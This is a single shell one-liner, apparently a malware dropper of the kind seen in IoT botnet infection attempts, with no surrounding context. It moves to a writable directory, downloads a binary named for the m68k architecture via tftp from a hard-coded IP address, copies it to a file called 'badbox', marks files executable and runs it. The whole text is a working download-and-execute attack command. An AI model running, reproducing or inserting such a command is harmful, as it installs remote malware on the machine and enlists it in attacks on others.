cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.m68k -g 107.173.209.45;cat fyfa.m68k >badbox;chmod +x *;./badbox
